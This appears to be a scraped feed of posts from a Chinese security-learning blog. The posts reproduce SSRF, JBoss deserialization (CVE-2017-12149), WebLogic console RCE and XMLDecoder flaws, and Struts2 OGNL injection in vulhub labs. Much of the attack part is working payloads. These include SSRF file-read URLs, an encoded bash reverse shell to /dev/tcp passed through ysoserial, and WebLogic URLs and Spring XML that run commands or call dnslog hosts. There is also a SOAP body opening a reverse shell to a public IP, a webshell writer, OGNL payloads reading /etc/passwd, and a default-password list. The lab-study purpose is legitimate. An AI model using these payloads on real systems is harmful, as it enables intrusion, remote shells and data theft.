第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 参考资料php&nbsp;伪协议 SSRF漏洞形成原因SSRF( Server- Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下,SSRF攻击的目标是从外网无法访问的内部系统。(正是因为它是由服务端发起的,所以它能够请求到与它相连而与外网隔离的内部系统) SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容,加载指定地址的图片,下载等等。利用的是服务端的请求伪造。SSRF 是利用存在缺陷的web应用作为代理攻击远程和本地的服务器由外网攻击者利用SSRF漏洞攻击内网 也就是说服务器端的验证并没有对其请求如获取图片的参数( Image=)做出严格的过滤以及限制,从而导致A网站可以从其他服务器上获取数据 利用点 访问服务端敏感文件,造成数据泄露 (例如windows下路径写法:?url=file://c:\\windows\\system32\\drivers\\etc\\hosts) 端口扫描 (例:?url=dict://127.0.0.1:3306) 应用指纹识别(例如:?url=http://localhost/phpmyadmin/readme) 内网攻击WEB,获取Shell(例如:?url=xxx) SSRF 挖掘方法 分享:通过URL地址分享网页内容 转码服务 在线翻译 图片加载与下载:通过URL地址加载或下载图片 图片、文章收藏功能 未公开的api实现以及其他调用URL的功能 从URL关键字中寻找 复现SSRF(curl)指向其它目标http://192.168.151.8/pkc/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pkc/vul/ssrf/ssrf_info/info1.php 端口扫描http://192.168.151.8/pkc/vul/ssrf/ssrf_curl.php?url=http://192.168.151.8:3306 访问服务端敏感文件http://192.168.151.8/pkc/vul/ssrf/ssrf_curl.php?url=file://c:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts SSRF(file_get_content)#读取info2.php文件 http://192.168.151.8/pkc/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=http://127.0.0.1/pkc/vul/ssrf/ssrf_info/info2.php #读取README.md文件（前提是里面有这个文件） http://192.168.151.8/pkc/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=../../README.md 总结 ssrf、文件包含、csrf对比 ssrf和文件包含区别：SSRF—和远程文件包含的区别在于远程文件包含多是包含攻击者的主机文件,SSRF是内网主机的文件 ssrf和csr区别：CSRF是跨站请求伪造攻击,由客户端发起 SSRF是服务器端请求伪造,由服务器发起 SSRF 防护 黑名单过滤: 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、localhost私有地址、iPv6地址 黑名单过滤: fle:///、dict://、 gopher://、ftp:∥ 危险schema 使用地址白名单 内网服务开启鉴权: Memcached,Reds, Elasticsearch and MongoDB 对回显内容进行识别,采取限制措施 需要使用互联网资源(比如贴吧使用网络图片)而无法使用白名单的情况:首先禁用 CURLOPT_FOLLOWLOCATION;然后通过域名获取目标ip,并过滤内部ip;最后识别返回的内容是否与假定内容一致","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"SSRF curl","slug":"SSRF-curl","permalink":"https://www.adalucky.com/tags/SSRF-curl/"},{"name":"SSRF file_get_content","slug":"SSRF-file-get-content","permalink":"https://www.adalucky.com/tags/SSRF-file-get-content/"}],"author":"Ada"},{"title":"JBoos","slug":"Security/JBoos","date":"2021-08-23T05:29:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/jboos/","link":"","permalink":"https://www.adalucky.com/security/jboos/","excerpt":"JBoos是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可,可以在任何商业应用中免费使用。 JBoss是一个管理EJB的容器和服务器,支持EJB1.1、EJB 2.0 和 EJB3 的规范。但 JBoss核心服务不包括支持 servlet/JSP 的WEB容器,一般与 Tomat 或Jetty绑定使用。","text":"JBoos是一个基于J2EE的开放源代码的应用服务器。 JBoss代码遵循LGPL许可,可以在任何商业应用中免费使用。 JBoss是一个管理EJB的容器和服务器,支持EJB1.1、EJB 2.0 和 EJB3 的规范。但 JBoss核心服务不包括支持 servlet/JSP 的WEB容器,一般与 Tomat 或Jetty绑定使用。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 参考资料Jboss漏洞利用 bash反弹shell时候,由于 Runtime. getRuntime()exec()中不能使用重定向和管道符符号,需要对其进行Base64编码 ysoserial是一款目前最流行的Java反序列化 Payload生成工具,目前支持29种的 Payload生成。所以我们使用 ysoserial来复现生成序列化数据,并重定向到exp.ser文件 反序列化工具ysoserial生成的payload无效 漏洞复现JBoss5×/6x反序列化漏洞简述漏洞环境：CVE-2017-12149 该漏洞为Java反序列化错误类型,存在于 Jboss的 Httpinvoker组件中的 ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查情况下尝试将来自客户端的数据流进行反序列化,从而导致了漏洞。 源码在jboss\\server\\all\\deploy\\httpha-invoker.sar\\invoker.war\\WEB-INF\\classes\\org\\jboss\\invocation\\http\\servlet目录下的ReadOnlyAccessFilter.class文件中,其中doFilter函数代码如下: public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { HttpServletRequest httpRequest = (HttpServletRequest)request; Principal user = httpRequest.getUserPrincipal(); if ((user == null) &amp;&amp; (this.readOnlyContext != null)) { ServletInputStream sis = request.getInputStream(); ObjectInputStream ois = new ObjectInputStream(sis); MarshalledInvocation mi = null; try { mi = (MarshalledInvocation)ois.readObject(); // 漏洞点 } catch (ClassNotFoundException e) { throw new ServletException(\"Failed to read MarshalledInvocation\", e); } request.setAttribute(\"MarshalledInvocation\", mi); mi.setMethodMap(this.namingMethodMap); Method m = mi.getMethod(); if (m != null) { validateAccess(m, mi); } } chain.doFilter(request, response); } 直接从http中获取数据，在没有进行检查或者过滤的情况下，尝试调用readobject()方法对数据流进行反序列操作，因此产生了Java反序列化漏洞。 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd jboss/CVE-2017-12149 # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d #重新启动一个容器 安全组没开端口 docker run -dt --name docker_weblogic -p 8080:8080 -p 9090:9990 --rm 5495c1f64144 # 测试完成后，删除整个环境 docker-compose down -v 漏洞复现 进入漏洞页面 http://www.security.ada:8080/invoker/readonly http响应码500(内部服务器错误——服务器端的CGI、ASP、JSP等程序发生错误)，分析猜想，此处服务器将用户提交的POST内容进行了Java反序列化。 编写反弹shell的命令#源指令 bash -i &gt;&amp; /dev/tcp/192.168.1.1/6666 0&gt;&amp;1 #编码后指令 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS82NjY2IDA+JjE=}|{base64,-d}|{bash,-i} 序列化数据生成 使用ysoserial来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5 ysoserial- payload无效 请使用CMD生成POC 不要使用 powershell 执行命令 java -jar ysoserial.jar CommonsCollections5 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}\" &gt; poc.ser 反弹shellcurl 执行#远程主机开启监听 nc -lvvp 6666 #本地机器执行 curl 指令 以二进制方式发送 poc.ser curl www.security.ada:8080/invoker/readonly --data-binary @poc.ser BurpSuite生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"JBoos反序列化","slug":"JBoos反序列化","permalink":"https://www.adalucky.com/tags/JBoos%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"Ada"},{"title":"weblogic漏洞","slug":"Security/weblogic","date":"2021-08-20T07:03:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/weblogic/","link":"","permalink":"https://www.adalucky.com/security/weblogic/","excerpt":"Weblogic 是美国 Oracle公司出品的一个 application server,确切的说是一个基于 JAVA EE 架构的中间件, WebLogic是用于开发、集成、部署和管理大型分布式 web 应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和 Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。","text":"Weblogic 是美国 Oracle公司出品的一个 application server,确切的说是一个基于 JAVA EE 架构的中间件, WebLogic是用于开发、集成、部署和管理大型分布式 web 应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和 Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 参考资料 Weblogic 漏洞之弱口令、任意文件读取、上传shell 弱口令环境搭建# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd weblogic/weak_password # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d #重新启动一个容器 我这边是因为我的 7001 5556 安全组没开端口 docker run -dt --name docker_weblogic -p 9091:5556 -p 9090:7001 --rm 7d35c6cd3bcd # 测试完成后，删除整个环境 docker-compose down -v #weblogic后台 http://www.security.ada:9090/console/login/LoginForm.jsp 常用弱口令 账户 密码 备注 weblogic Oracle@123 本环境存在该弱口令 system password weblogic weblogic guest guest portaladmin portaladmin admin security joe password mary password system security wlcsystem wlcsystem wlcsystem sipisystem 脚本爆破使用weblogicweakpwds.py 进行爆破 任意文件读取确认是否存在任意文件读取漏洞-TODO# poc 未能返回 环境无任意文件读取漏洞 http://www.security.ada:9090/hello/file.jsp?path=/etc/passwd 破解-TODO文件包含漏洞未实现，阻塞 后台上传webshell上传war包 验证# url http://www.security.ada:9090/test/JspSpy.jsp # password 默认密码在 JspSpy.jsp 文件中定义的 ninty 控制台未授权远程命令执行漏洞描述Weblogic管理控制台未授权远程命令执行漏洞(CVE-2020-14882 CVE-2020-14883)Weblogic是 Oracle公司推出的J2EE应用服务器。在2020年10月的更新中, Oracle官方修复了两个长亭科技安全研究员@ voidfyoo提交的安全漏洞,分别是 CVE-2020-14882 和CVE-2020-14883 CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台,CVE-2020-14883 允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链,可通过一个GET请求在远程 Weblogic服务器上以未授权的任意用户身份执行命令 影响版本Weblogic 10.3.6.0.0Weblogic:12.1.3.0.0Weblogic:12.2.1.3.0Weblogic:12.2.1.4.0Weblogic:14.1.1.0.0 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd weblogic/CVE-2020-14882 # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d #重新启动一个容器 我这边是因为我的 7001 安全组没开端口 docker run -dt --name docker_weblogic_14882 -p 9090:7001 --rm e0958635a01f 漏洞复现权限绕过#HackBar http://www.security.ada:9090/console/css/%252e%252e%252fconsole.portal 访问后台后,可以发现我们现在是低权限的用户无法安装应用,所以也无法直接执行任意代码 此时需要利用到第二个漏洞cVE-2020-14883这个漏洞的利用方式有两种: com.tangosol.coherence.mvel2.sh.ShellSession com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext 远程命令执行 这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类。 通过com.tangosol.coherence.mvel2.sh.ShellSession 执行命令 管理员登录查看校验#HackBar http://www.security.ada:9090/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success20210820');\") 进入容器，可以发现touch /tmp/success20210820已成功写入 dnslog外带校验#HackBar %20 表示空格 http://www.security.ada:9090/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('curl%201byd87.dnslog.cn');\") 通杀的方法com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext是一种更为通杀的方法，最早在CVE-2019-2725被提出，对于所有Weblogic版本均有效。 首先，我们需要构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上，我这里演示放在七牛云上 &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt; # HackBar 语句 XML文件必须要生成在一个可访问的目标地址上 http://www.security.ada:9090/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://blog.adalucky.com/rce.xml\") 同样也可以用dnslog的方式，写在xml文件中上传至七牛云执行即可 替换curl后的域名即可 &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.1.1/6666 0&gt;&amp;1]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt; 反弹shell &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[curl vo3d82.dnslog.cn]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt; XMLDecoder反序列化漏洞Weblogic&lt;10.3.6 ‘wls-wsat’ XMLDecoder反序列化漏洞(CVE-2017-10271) Weblogic的 WLS Security组件对外提供 webservice服务,其中使用了 XMLDecoder来解析用户传入的XML数据,在解析的过程中出现反序列化漏洞,导致可执行任意命令。 影响版本10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0 启动环境# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd weblogic/CVE-2017-10271 # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d #重新启动一个容器 我这边是因为我的 7001 5556 安全组没开端口 docker run -dt --name docker_weblogic_201710271 -p 9090:7001 --rm 7d35c6cd3bcd # 测试完成后，删除整个环境 docker-compose down -v\u0011 #weblogic后台 http://www.security.ada:9090/console/login/LoginForm.jsp 漏洞复现反弹shell 浏览器访问地址：http://www.security.ada:9090/wls-wsat/CoordinatorPortType 并通过BurpSuite 截包 将 GET 请求类型修改为 POST 设置/修改 Content-Type: text/xml 空一行，以及 body 体的xml数据加入 &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;void class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/47.100.110.84/6666 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; ![BurpSuite 反弹](/Users/ada/Library/Application Support/typora-user-images/image-20210822154914037.png) 写入webshell 步骤和上面反弹shell一致，只是 xml 文件内容有所变化 写入后访问：http://www.security.ada:9090/bea_wls_internal/test.jsp &lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java&gt;&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;object class=\"java.io.PrintWriter\"&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt; &lt;void method=\"println\"&gt;&lt;string&gt; &lt;![CDATA[ &lt;% out.print(\"test\"); %&gt; ]]&gt; &lt;/string&gt; &lt;/void&gt; &lt;void method=\"close\"/&gt; &lt;/object&gt;&lt;/java&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 工具使用可通过一些工具的利用来实现框架漏洞的复现","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"弱口令","slug":"弱口令","permalink":"https://www.adalucky.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"},{"name":"未授权远程命令执行","slug":"未授权远程命令执行","permalink":"https://www.adalucky.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"后台上传大马","slug":"后台上传大马","permalink":"https://www.adalucky.com/tags/%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0%E5%A4%A7%E9%A9%AC/"}],"author":"Ada"},{"title":"Struts2","slug":"Security/Struts2","date":"2021-08-19T16:14:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/struts2/","link":"","permalink":"https://www.adalucky.com/security/struts2/","excerpt":"Apache Struts2最初被称为 WebWork2,它是一个简洁的、可扩展的框架,可用于创建企业级 Java web应用程序。设计这个框架是为了从构建部署、到应用程序维护方面来简化整个开发周期。","text":"Apache Struts2最初被称为 WebWork2,它是一个简洁的、可扩展的框架,可用于创建企业级 Java web应用程序。设计这个框架是为了从构建部署、到应用程序维护方面来简化整个开发周期。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 简介漏洞环境：struts2/s2-xxx 原理该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行 参考资料:https://blog.csdn.net/qq_35326718/article/details/70943604 s2-001参考：https://cwiki.apache.org/confluence/display/WW/S2-001 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd struts2/s2-001 # 自动化编译环境 docker-compose build #执行如下命令启动服务 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 漏洞复现确认是否存在漏洞原理和 sql 注入一样，先确定是否存在漏洞 %{2*2} 获取tomcat执行路径%{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"} 获取Web路径%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()} 执行任意命令命令加参数：new java.lang.String[]{\"cat\",\"/etc/passwd\"} %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"cat\",\"/etc/passwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"whoami\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} s2-005简介影响版本:2.0.0-2.1.8.1漏洞详情:https://cwiki.apache.org/confluence/display/WW/S2-005 https://www.cnblogs.com/devi1/p/13486633.html s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\\u0023)或8进制(\\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上 XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如： user.address.city=Bishkek&amp;user['favoriteDrink']=kumys //会被转化成 action.getUser().getAddress().setCity(\"Bishkek\") action.getUser().setFavoriteDrink(\"kumys\") 触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下： S2-003 使用\\u0023绕过s2对#的防御 S2-003 后官方增加了安全模式（沙盒） S2-005 使用OGNL表达式将沙盒关闭，继续执行代码 启动# 进入vulhub 